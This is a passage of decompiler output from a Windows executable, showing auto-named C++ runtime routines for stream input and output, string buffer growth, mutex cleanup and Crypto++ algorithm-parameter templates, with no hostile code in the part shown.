  *(_WORD *)(a1 + 14) = result;
  return result;
}
// 4260B0: could not find valid save-restore pair for ebp
// 421510: using guessed type int __thiscall unknown_libname_1(_DWORD);

//----- (00426290) --------------------------------------------------------
_BYTE *__cdecl sub_426290(_BYTE *a1, int a2)
{
  char v2; // bl
  int v3; // ecx
  int v4; // eax
  void (__thiscall ***v5)(_DWORD, int); // eax
  _BYTE *v6; // eax
  int v7; // ecx
  unsigned int v8; // edi
  unsigned int v9; // eax
  int i; // eax
  int v11; // eax
  _BYTE *v12; // ecx
  char v13; // al
  int v14; // ecx
  _DWORD v16[13]; // [esp+0h] [ebp-80h] BYREF
  _BYTE *v17; // [esp+34h] [ebp-4Ch]
  char v18; // [esp+38h] [ebp-48h]
  char v19[4]; // [esp+3Ch] [ebp-44h] BYREF
  int v20; // [esp+40h] [ebp-40h]
  int v21; // [esp+44h] [ebp-3Ch]
  unsigned int v22; // [esp+48h] [ebp-38h]
  void **v23; // [esp+4Ch] [ebp-34h]
  char *v24; // [esp+50h] [ebp-30h]
  _BYTE *v25; // [esp+54h] [ebp-2Ch]
  int v26; // [esp+58h] [ebp-28h]
  int v27; // [esp+5Ch] [ebp-24h]
  char v28; // [esp+63h] [ebp-1Dh]
  int v29; // [esp+64h] [ebp-1Ch]
  int v30; // [esp+68h] [ebp-18h]
  _DWORD *v31; // [esp+70h] [ebp-10h]
  int v32; // [esp+7Ch] [ebp-4h]
  int savedregs; // [esp+80h] [ebp+0h] BYREF

  v31 = v16;
  v25 = a1;
  v23 = (void **)a2;
  v27 = 0;
  v2 = 0;
  v26 = 0;
  v28 = 0;
  v17 = a1;
  v3 = *(_DWORD *)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 56];
  if ( v3 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v32 = 0;
  v18 = sub_427AC0(a1, 0);
  v32 = 1;
  if ( v18 )
  {
    v4 = *(_DWORD *)(*(_DWORD *)a1 + 4);
    LOBYTE(v32) = 2;
    v20 = *(_DWORD *)(*(_DWORD *)&a1[v4 + 48] + 4);
    (*(void (**)(void))(*(_DWORD *)v20 + 4))();
    v27 = 1;
    v24 = sub_421800((int)&savedregs, (int)v19);
    v27 = 0;
    LOBYTE(v32) = 1;
    if ( v20 )
    {
      v5 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
      if ( v5 )
        (**v5)(v5, 1);
    }
    v6 = (_BYTE *)a2;
    if ( *(_DWORD *)(a2 + 20) >= 0x10u )
      v6 = *(_BYTE **)a2;
    *(_DWORD *)(a2 + 16) = 0;
    *v6 = 0;
    LOBYTE(v32) = 3;
    v7 = *(_DWORD *)(*(_DWORD *)a1 + 4);
    v8 = *(_DWORD *)&a1[v7 + 32];
    v9 = *(_DWORD *)&a1[v7 + 36];
    if ( __SPAIR64__(v9, v8) <= 0
      || (v16[6] = *(_DWORD *)&a1[v7 + 32],
          v16[7] = v9,
          v30 = -1,
          v16[12] = 16,
          v16[11] = -2,
          v16[10] = 0x7FFFFFFF,
          v8 >= 0x7FFFFFFF) )
    {
      v29 = -1;
      v16[9] = 16;
      v16[8] = -2;
      v20 = 0x7FFFFFFF;
      v8 = 0x7FFFFFFF;
    }
    else
    {
      v16[4] = v8;
      v16[5] = v9;
    }
    v22 = v8;
    for ( i = sub_4276D0(*(_DWORD ***)&a1[v7 + 56]); ; i = sub_427660(*(_DWORD ***)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4)
                                                                                     + 56]) )
    {
      v21 = i;
      if ( !v8 )
        break;
      if ( i == -1 )
      {
        v2 = 1;
        v26 = 1;
        break;
      }
      if ( (*(_BYTE *)(*((_DWORD *)v24 + 3) + 2 * (unsigned __int8)i) & 0x48) != 0 )
        break;
      sub_41ED20(v23, i);
      v28 = 1;
      v22 = --v8;
    }
    v32 = 1;
  }
  v11 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  *(_DWORD *)&a1[v11 + 32] = 0;
  *(_DWORD *)&a1[v11 + 36] = 0;
  if ( !v28 )
    v2 |= 2u;
  v12 = &a1[*(_DWORD *)(*(_DWORD *)a1 + 4)];
  v13 = v2 | v12[12] | 4;
  if ( *((_DWORD *)v12 + 14) )
    v13 = v2 | v12[12];
  sub_4036A0(v12, v13, 0);
  v32 = -1;
  v14 = *(_DWORD *)&v17[*(_DWORD *)(*(_DWORD *)v17 + 4) + 56];
  if ( v14 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v14 + 8))(v14);
  return a1;
}
// 426290: using guessed type char var_44[4];

//----- (004264F0) --------------------------------------------------------
int __stdcall sub_4264F0(int a1, _DWORD *a2, int a3)
{
  *a2 = &std::_Generic_error_category::`vftable';
  a2[1] = 3;
  return 1;
}
// 4B83DC: using guessed type void *std::_Generic_error_category::`vftable';

//----- (00426510) --------------------------------------------------------
int __stdcall sub_426510(int a1, _DWORD *a2, int a3)
{
  *a2 = &std::_Iostream_error_category::`vftable';
  a2[1] = 5;
  return 1;
}
// 4B83F8: using guessed type void *std::_Iostream_error_category::`vftable';

//----- (00426530) --------------------------------------------------------
int __stdcall sub_426530(int a1, _DWORD *a2, int a3)
{
  *a2 = &std::_System_error_category::`vftable';
  a2[1] = 7;
  return 1;
}
// 4BD40C: using guessed type void *std::_System_error_category::`vftable';

//----- (00426550) --------------------------------------------------------
int __cdecl sub_426550(unsigned int a1, unsigned int a2)
{
  int v2; // ecx
  unsigned int v3; // eax
  int v5; // esi
  unsigned __int64 v6; // rax
  int v7; // edi
  unsigned int v8; // ecx
  unsigned int v10; // [esp+18h] [ebp+Ch]

  v3 = a2;
  v5 = v2;
  if ( a2 )
  {
    do
    {
      v6 = __PAIR64__(v3, a1) / 0x3B9ACA00;
      v7 = 9;
      v8 = a1 - 1000000000 * v6;
      v10 = v6;
      do
      {
        *(_BYTE *)--v5 = v8 % 0xA + 48;
        v8 /= 0xAu;
        --v7;
      }
      while ( v7 );
      v3 = HIDWORD(v6);
      a1 = v10;
    }
    while ( HIDWORD(v6) );
  }
  do
  {
    *(_BYTE *)--v5 = a1 % 0xA + 48;
    a1 /= 0xAu;
  }
  while ( a1 );
  return v5;
}
// 42655C: variable 'v2' is possibly undefined

//----- (004265F0) --------------------------------------------------------
int __thiscall sub_4265F0(int this, int a2, int a3, char a4)
{
  _DWORD *v5; // edi
  _DWORD *v6; // ecx
  void *v7; // eax
  void *v8; // edx
  int v9; // ebx
  void (__thiscall ***v10)(_DWORD, int); // ecx
  void (__thiscall ***v11)(_DWORD, int); // ecx

  v5 = operator new(0x2Cu);
  memset(v5, 0, 0x2Cu);
  v5[1] = a2;
  *v5 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *((_BYTE *)v5 + 8) = a4;
  *((_BYTE *)v5 + 9) = 0;
  v5[3] = 0;
  v6 = v5 + 4;
  *v5 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';
  *((_BYTE *)v5 + 16) = *(_BYTE *)a3;
  v5[5] = *(_DWORD *)(a3 + 4);
  v5[6] = *(_DWORD *)(a3 + 8);
  v5[8] = *(_DWORD *)(a3 + 16);
  v5[9] = *(_DWORD *)(a3 + 20);
  v7 = *(void **)(a3 + 20);
  if ( v7 )
  {
    v7 = sub_45AEA0((size_t)v7);
    v6 = v5 + 4;
  }
  v6[6] = v7;
  v8 = *(void **)(a3 + 24);
  if ( v8 )
    sub_401670(v7, v6[5], v8, *(_DWORD *)(a3 + 20));
  v9 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  v10 = (void (__thiscall ***)(_DWORD, int))v5[3];
  if ( v10 )
    (**v10)(v10, 1);
  v5[3] = v9;
  v11 = *(void (__thiscall ****)(_DWORD, int))(this + 4);
  if ( v11 )
    (**v11)(v11, 1);
  *(_DWORD *)(this + 4) = v5;
  *(_BYTE *)(this + 8) = a4;
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4B93B0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable';

//----- (00426740) --------------------------------------------------------
int __thiscall sub_426740(int this, int a2, _DWORD *a3, char a4)
{
  _DWORD *v5; // esi
  int v6; // eax
  void (__thiscall ***v7)(_DWORD, int); // ecx
  void (__thiscall ***v8)(_DWORD, int); // ecx
  int v10; // [esp+Ch] [ebp-18h]

  v5 = operator new(0x14u);
  *(_OWORD *)v5 = 0i64;
  v5[4] = 0;
  v5[1] = a2;
  *v5 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *((_BYTE *)v5 + 8) = a4;
  *((_BYTE *)v5 + 9) = 0;
  v5[3] = 0;
  *v5 = &CryptoPP::AlgorithmParametersTemplate<int>::`vftable';
  v5[4] = *a3;
  v6 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  v7 = (void (__thiscall ***)(_DWORD, int))v5[3];
  v10 = v6;
  if ( v7 )
  {
    (**v7)(v7, 1);
    v6 = v10;
  }
  v5[3] = v6;
  v8 = *(void (__thiscall ****)(_DWORD, int))(this + 4);
  if ( v8 )
    (**v8)(v8, 1);
  *(_DWORD *)(this + 4) = v5;
  *(_BYTE *)(this + 8) = a4;
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4B93A0: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int>::`vftable';

//----- (00426840) --------------------------------------------------------
int __thiscall sub_426840(int this, int a2, _BYTE *a3, char a4)
{
  _DWORD *v5; // esi
  int v6; // eax
  void (__thiscall ***v7)(_DWORD, int); // ecx
  void (__thiscall ***v8)(_DWORD, int); // ecx
  int v10; // [esp+Ch] [ebp-18h]

  v5 = operator new(0x14u);
  *(_OWORD *)v5 = 0i64;
  v5[4] = 0;
  v5[1] = a2;
  *v5 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *((_BYTE *)v5 + 8) = a4;
  *((_BYTE *)v5 + 9) = 0;
  v5[3] = 0;
  *v5 = &CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';
  *((_BYTE *)v5 + 16) = *a3;
  v6 = *(_DWORD *)(this + 4);
  *(_DWORD *)(this + 4) = 0;
  v7 = (void (__thiscall ***)(_DWORD, int))v5[3];
  v10 = v6;
  if ( v7 )
  {
    (**v7)(v7, 1);
    v6 = v10;
  }
  v5[3] = v6;
  v8 = *(void (__thiscall ****)(_DWORD, int))(this + 4);
  if ( v8 )
    (**v8)(v8, 1);
  *(_DWORD *)(this + 4) = v5;
  *(_BYTE *)(this + 8) = a4;
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BA254: using guessed type void *CryptoPP::AlgorithmParametersTemplate<bool>::`vftable';

//----- (00426940) --------------------------------------------------------
int __fastcall sub_426940(int a1, int a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int v6; // esi
  unsigned int v7; // esi
  int v8; // ecx
  int v9; // ecx
  int v10; // edx
  int v11; // eax
  int v12; // ecx
  char v13; // al
  int v14; // ecx
  int v16; // [esp+0h] [ebp-38h] BYREF
  _BYTE *v17; // [esp+10h] [ebp-28h] BYREF
  char v18; // [esp+14h] [ebp-24h]
  unsigned int v19; // [esp+18h] [ebp-20h]
  int v20; // [esp+1Ch] [ebp-1Ch]
  int v21; // [esp+20h] [ebp-18h]
  int v22; // [esp+24h] [ebp-14h]
  int *v23; // [esp+28h] [ebp-10h]
  int v24; // [esp+34h] [ebp-4h]

  v23 = &v16;
  v20 = a2;
  v21 = a1;
  v4 = 0;
  v22 = 0;
  v5 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v6 = *(_DWORD *)(v5 + a1 + 32);
  if ( *(__int64 *)(v5 + a1 + 32) <= 0 || v6 <= a3 )
    v7 = 0;
  else
    v7 = v6 - a3;
  sub_41D970(&v17, a1);
  v24 = 0;
  if ( v18 )
  {
    LOBYTE(v24) = 1;
    v8 = *(_DWORD *)a1;
    if ( (*(_DWORD *)(*(_DWORD *)(*(_DWORD *)a1 + 4) + a1 + 20) & 0x1C0) != 64 )
    {
      while ( v7 )
      {
        if ( (unsigned __int16)sub_4217C0(
                                 *(_DWORD ***)(*(_DWORD *)(*(_DWORD *)a1 + 4) + a1 + 56),
                                 *(unsigned __int16 *)(*(_DWORD *)(*(_DWORD *)a1 + 4) + a1 + 64)) == 0xFFFF )
        {
          v4 = 4;
          v22 = 4;
          goto LABEL_15;
        }
        v19 = --v7;
      }
      v8 = *(_DWORD *)a1;
    }
    v9 = *(_DWORD *)(*(_DWORD *)(v8 + 4) + a1 + 56);
    if ( (*(int (__thiscall **)(int, int, unsigned int, _DWORD))(*(_DWORD *)v9 + 36))(v9, v20, a3, 0) != a3 || v10 )
    {
      v4 = 4;
LABEL_20:
      v22 = v4;
    }
    else
    {
LABEL_15:
      while ( v7 )
      {
        if ( (unsigned __int16)sub_4217C0(
                                 *(_DWORD ***)(*(_DWORD *)(*(_DWORD *)a1 + 4) + a1 + 56),
                                 *(unsigned __int16 *)(*(_DWORD *)(*(_DWORD *)a1 + 4) + a1 + 64)) == 0xFFFF )
        {
          v4 |= 4u;
          goto LABEL_20;
        }
        v19 = --v7;
      }
    }
    v11 = *(_DWORD *)(*(_DWORD *)a1 + 4);
    *(_DWORD *)(v11 + a1 + 32) = 0;
    *(_DWORD *)(v11 + a1 + 36) = 0;
    v24 = 0;
  }
  else
  {
    LOBYTE(v4) = 4;
  }
  v12 = a1 + *(_DWORD *)(*(_DWORD *)a1 + 4);
  v13 = v4 | *(_BYTE *)(v12 + 12) | 4;
  if ( *(_DWORD *)(v12 + 56) )
    v13 = v4 | *(_BYTE *)(v12 + 12);
  sub_4036A0((_DWORD *)v12, v13, 0);
  v24 = 3;
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(v17);
  v24 = -1;
  v14 = *(_DWORD *)&v17[*(_DWORD *)(*(_DWORD *)v17 + 4) + 56];
  if ( v14 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v14 + 8))(v14);
  return a1;
}
// 426A25: variable 'v10' is possibly undefined
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (00426B10) --------------------------------------------------------
int *__cdecl sub_426B10(int *a1, int a2, unsigned int a3)
{
  int v3; // edi
  int v4; // eax
  unsigned int v5; // esi
  int v6; // esi
  int v7; // ecx
  int v8; // ecx
  int v9; // eax
  int *v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // edx
  int v14; // eax
  _BYTE *v15; // ecx
  char v16; // al
  char v17; // al
  int *v18; // esi
  int v19; // ecx
  int v21; // [esp+0h] [ebp-34h] BYREF
  int *v22; // [esp+14h] [ebp-20h]
  bool v23; // [esp+18h] [ebp-1Ch]
  int v24; // [esp+1Ch] [ebp-18h]
  int v25; // [esp+20h] [ebp-14h]
  int *v26; // [esp+24h] [ebp-10h]
  int v27; // [esp+30h] [ebp-4h]

  v26 = &v21;
  v3 = 0;
  v25 = 0;
  v4 = *(_DWORD *)(*a1 + 4);
  v5 = *(int *)((char *)a1 + v4 + 32);
  if ( *(__int64 *)((char *)a1 + v4 + 32) <= 0 || v5 <= a3 )
    v6 = 0;
  else
    v6 = v5 - a3;
  v22 = a1;
  v7 = *(int *)((char *)a1 + v4 + 56);
  if ( v7 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 4))(v7);
  v27 = 0;
  v8 = *(_DWORD *)(*a1 + 4);
  v9 = *a1;
  if ( !*(int *)((char *)a1 + v8 + 12) )
  {
    v10 = *(int **)((char *)a1 + v8 + 60);
    if ( v10 )
    {
      if ( v10 != a1 )
      {
        sub_4212B0(v10);
        v9 = *a1;
      }
    }
  }
  v11 = *(int *)((char *)a1 + *(_DWORD *)(v9 + 4) + 12);
  v23 = v11 == 0;
  v27 = 1;
  if ( v11 )
  {
    LOBYTE(v3) = 4;
  }
  else
  {
    LOBYTE(v27) = 2;
    v12 = *a1;
    if ( (*(int *)((char *)a1 + *(_DWORD *)(*a1 + 4) + 20) & 0x1C0) != 64 )
    {
      while ( v6 )
      {
        if ( sub_425930(
               *(_DWORD ***)((char *)a1 + *(_DWORD *)(*a1 + 4) + 56),
               *((_BYTE *)a1 + *(_DWORD *)(*a1 + 4) + 64)) == -1 )
        {
          v3 = 4;
          v25 = 4;
          goto LABEL_21;
        }
        v24 = --v6;
      }
      v12 = *a1;
    }
    if ( sub_41FD90(*(void **)((char *)a1 + *(_DWORD *)(v12 + 4) + 56), a2, a3, 0) != a3 || v13 )
    {
      v3 = 4;
LABEL_26:
      v25 = v3;
    }
    else
    {
LABEL_21:
      while ( v6 )
      {
        if ( sub_425930(
               *(_DWORD ***)((char *)a1 + *(_DWORD *)(*a1 + 4) + 56),
               *((_BYTE *)a1 + *(_DWORD *)(*a1 + 4) + 64)) == -1 )
        {
          v3 |= 4u;
          goto LABEL_26;
        }
        v24 = --v6;
      }
    }
    v14 = *(_DWORD *)(*a1 + 4);
    *(int *)((char *)a1 + v14 + 32) = 0;
    *(int *)((char *)a1 + v14 + 36) = 0;
    v27 = 1;
  }
  v15 = (char *)a1 + *(_DWORD *)(*a1 + 4);
  v16 = v3 | v15[12] | 4;
  if ( *((_DWORD *)v15 + 14) )
    v16 = v3 | v15[12];
  sub_4036A0(v15, v16, 0);
  v27 = 4;
  v17 = j____uncaught_exception();
  v18 = v22;
  if ( !v17 )
    sub_421050(v22);
  v27 = -1;
  v19 = *(int *)((char *)v18 + *(_DWORD *)(*v18 + 4) + 56);
  if ( v19 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v19 + 8))(v19);
  return a1;
}
// 426C1F: variable 'v13' is possibly undefined
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (00426D00) --------------------------------------------------------
_DWORD *__stdcall sub_426D00(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *i; // esi

  for ( i = a1; i != a2; i += 6 )
  {
    sub_419BE0(a3, i);
    a3 += 6;
  }
  sub_4250C0((int)a3, (int)a3);
  return a3;
}

//----- (00426DB0) --------------------------------------------------------
_DWORD *__fastcall sub_426DB0(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  for ( ; a1 != a2; a1 += 2 )
  {
    *a3 = *a1;
    a3[1] = a1[1];
    a3 += 2;
    *a1 = 0;
    a1[1] = 0;
  }
  return a3;
}

//----- (00426E50) --------------------------------------------------------
int __fastcall sub_426E50(int a1, int a2, int a3)
{
  for ( ; a1 != a2; a1 += 24 )
  {
    *(_DWORD *)(a3 + 16) = 0;
    *(_DWORD *)(a3 + 20) = 0;
    *(_OWORD *)a3 = *(_OWORD *)a1;
    *(_QWORD *)(a3 + 16) = *(_QWORD *)(a1 + 16);
    a3 += 24;
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 7;
    *(_WORD *)a1 = 0;
  }
  sub_425130(a3, a3);
  return a3;
}

//----- (00426F30) --------------------------------------------------------
void **__thiscall sub_426F30(void **Src, unsigned int a2, int a3, int a4, const void *a5, int a6)
{
  void *v7; // esi
  unsigned int v8; // edx
  unsigned int v9; // esi
  unsigned int v10; // ecx
  unsigned int v11; // edx
  size_t v12; // eax
  void *v13; // eax
  _DWORD *v14; // edi
  void *v15; // esi
  size_t v17; // [esp-4h] [ebp-20h]
  unsigned int v18; // [esp+10h] [ebp-Ch]
  void *v19; // [esp+14h] [ebp-8h]
  unsigned int v20; // [esp+18h] [ebp-4h]
  char *v21; // [esp+18h] [ebp-4h]

  v7 = Src[4];
  v19 = v7;
  if ( 2147483646 - (int)v7 < a2 )
    sub_4257D0();
  v8 = (unsigned int)Src[5];
  v20 = (unsigned int)v7 + a2;
  v9 = v20 | 7;
  v18 = v8;
  if ( (v20 | 7) <= 0x7FFFFFFE )
  {
    if ( v8 <= 2147483646 - (v8 >> 1) )
    {
      if ( v9 < v8 + (v8 >> 1) )
        v9 = v8 + (v8 >> 1);
    }
    else
    {
      v9 = 2147483646;
    }
  }
  else
  {
    v9 = 2147483646;
  }
  v10 = __CFADD__(v9, 1) ? -1 : v9 + 1;
  v11 = 2 * v10;
  if ( v10 <= 0x7FFFFFFF )
  {
    if ( v11 < 0x1000 )
    {
      if ( v11 )
        v14 = operator new(2 * v10);
      else
        v14 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v11 = -1;
  }
  v12 = v11 + 35;
  if ( v11 + 35 <= v11 )
    v12 = -1;
  v13 = operator new(v12);
  if ( !v13 )
    goto LABEL_25;
  v14 = (_DWORD *)(((unsigned int)v13 + 35) & 0xFFFFFFE0);
  *(v14 - 1) = v13;
LABEL_18:
  Src[4] = (void *)v20;
  Src[5] = (void *)v9;
  v17 = 2 * a6;
  v21 = (char *)v14 + 2 * a6;
  if ( v18 >= 8 )
  {
    v15 = *Src;
    memmove(v14, a5, v17);
    memmove(v21, v15, 2 * (_DWORD)v19 + 2);
    if ( 2 * v18 + 2 < 0x1000 )
    {
LABEL_22:
      sub_46C87D(v15);
      *Src = v14;
      return Src;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_22;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v14, a5, v17);
  memmove(v21, Src, 2 * (_DWORD)v19 + 2);
  *Src = v14;
  return Src;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004270A0) --------------------------------------------------------
_BYTE *__cdecl sub_4270A0(const char *a1)
{
  const char *v1; // esi
  unsigned int v2; // kr00_4
  unsigned int v3; // edi
  _BYTE *v4; // eax
  _BYTE *v5; // edx
  int v6; // ecx
  char v7; // al

  v1 = a1;
  v2 = strlen(a1);
  v3 = v2 + 1;
  v4 = calloc(v2 + 1, 1u);
  v5 = v4;
  if ( !v4 )
    sub_46A166();
  if ( v2 != -1 )
  {
    v6 = v4 - a1;
    do
    {
      v7 = *v1++;
      v1[v6 - 1] = v7;
      --v3;
    }
    while ( v3 );
  }
  return v5;
}
// 46A166: using guessed type void __noreturn sub_46A166(void);

//----- (004270F0) --------------------------------------------------------
int __thiscall sub_4270F0(int *this)
{
  int v1; // ecx
  int result; // eax
  int v3; // ecx

  v1 = *this;
  result = *(_DWORD *)(*(_DWORD *)v1 + 4);
  v3 = *(_DWORD *)(result + v1 + 56);
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}

//----- (00427140) --------------------------------------------------------
void __thiscall sub_427140(_DWORD *this)
{
  _DWORD *v2; // esi
  struct _Cnd_internal_imp_t *v3; // esi
  struct _Mtx_internal_imp_t *v4; // ebx
  int v5; // eax

  v2 = (_DWORD *)this[4];
  if ( v2 )
  {
    sub_425AC0(v2);
    sub_46C87D(v2);
  }
  v3 = (struct _Cnd_internal_imp_t *)this[1];
  v4 = (struct _Mtx_internal_imp_t *)this[2];
  v5 = _Mtx_unlock(v4);
  if ( v5 )
    std::_Throw_C_error(v5);
  _Mtx_destroy(v4);
  _Cnd_destroy(v3);
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00427220) --------------------------------------------------------
void __thiscall sub_427220(_DWORD *this)
{
  _DWORD *v2; // esi
  struct _Cnd_internal_imp_t *v3; // esi
  struct _Mtx_internal_imp_t *v4; // ebx
  int v5; // eax

  v2 = (_DWORD *)this[4];
  if ( v2 )
  {
    sub_425A10(v2);
    sub_46C87D(v2);
  }
  v3 = (struct _Cnd_internal_imp_t *)this[1];
  v4 = (struct _Mtx_internal_imp_t *)this[2];
  v5 = _Mtx_unlock(v4);
  if ( v5 )
    std::_Throw_C_error(v5);
  _Mtx_destroy(v4);
  _Cnd_destroy(v3);
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);

//----- (00427330) --------------------------------------------------------
int __thiscall sub_427330(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BA178: using guessed type void *CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable';

//----- (004273E0) --------------------------------------------------------
char __thiscall sub_4273E0(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4EE00C, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&int const * `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4EE008: using guessed type const int *int const * `RTTI Type Descriptor';
// 4EE00C: using guessed type int dword_4EE00C;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (00427440) --------------------------------------------------------
int __thiscall sub_427440(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<wchar_t const *>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4CF8E4: using guessed type void *CryptoPP::AlgorithmParametersTemplate<wchar_t const *>::`vftable';

//----- (004274F0) --------------------------------------------------------
char __thiscall sub_4274F0(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4EE1C8, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&wchar_t const * `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4EE1C4: using guessed type const wchar_t *wchar_t const * `RTTI Type Descriptor';
// 4EE1C8: using guessed type int dword_4EE1C8;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (00427550) --------------------------------------------------------
int __thiscall sub_427550(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<char const *>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4CF674: using guessed type void *CryptoPP::AlgorithmParametersTemplate<char const *>::`vftable';

//----- (00427600) --------------------------------------------------------
char __thiscall sub_427600(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4ED4EC, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&char const * `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4ED4E8: using guessed type const char *char const * `RTTI Type Descriptor';
// 4ED4EC: using guessed type int dword_4ED4EC;
// 4EE1D8: using guessed type int dword_4EE1D8;

